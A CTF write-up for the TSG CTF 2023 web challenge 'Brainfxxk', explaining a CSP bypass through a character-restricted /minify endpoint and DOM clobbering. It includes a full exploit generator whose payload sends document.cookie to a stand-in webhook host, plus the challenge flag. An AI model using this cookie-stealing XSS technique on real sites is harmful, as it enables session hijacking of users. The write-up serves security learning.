# TSG CTF 2023 - web/Brainfxxk Challenge

- 11 solves / 267 pts
- Author: fabon-f

You can get XSS at `/:codeId`, but CSP is enabled.

```
Content-Security-Policy: style-src 'self' https://unpkg.com/sakura.css@1.4.1/css/sakura.css ; script-src 'self' ; object-src 'none' ; font-src 'none'
```

You can use `/minify` as `<script>` src to get full xss, but the characters is limited at `/minify`.
At `/minify`, you can use only `><+-=r[]` characters. You need to construct your payload with these characters.

```javascript
app.get('/minify', (req, res) => {
    const code = req.query.code ?? ''
    res.send(code.replaceAll(/[^><+\-=r\[\]]/g, ''))
})
```

I did DOM Clobbering with like `<a id=r href=abc:def>` to get lowercase alphabets.
Then, I constructed `download` from the characters and obtained arbitrary string by getting `download` attribute.
Finally, I wrote payload equal to `r["ownerDocument"]["location"] = "http://webhook.example.com/?" + r["ownerDocument"]["cookie"]`;

## Exploit

```javascript
const char = (c) => {
	const code = c.charCodeAt(0);
	const element_id = "r".repeat(code);
	return `[${element_id}+[]][+[]][+[]]`;
}

const string = (s) => {
	return [...s].map(c => char(c)).join("+");
}

console.log(char("a"));

const xss_payload = `
[r=${string("download")}]+[rr[rr[r]][rrr[r]]=rrrrr[r]+rr[rr[r]][rrrr[r]]]
`;

console.log(xss_payload)

let dom_payload = `
<a id=rr download=ownerDocument></a>
<a id=rrr download=location></a>
<a id=rrrr download=cookie></a>
<a id=rrrrr download="https://webhook.example.com/?"></a>
`;

for (let c of "abcdefghijklmnopqrstuvwxyz0123456789") {
	const code = c.charCodeAt(0);
	const element_id = "r".repeat(code);
	dom_payload += `<a id=${element_id} href="${c}xx:abc">${c}</a>\n`;
}

dom_payload += `<script src="/minify?code=${encodeURIComponent(xss_payload)}"></script>`

console.log(dom_payload)

// submit payload and report it
```

## Flag

```
TSGCTF{u_r_j5fuck_m4573r}
```
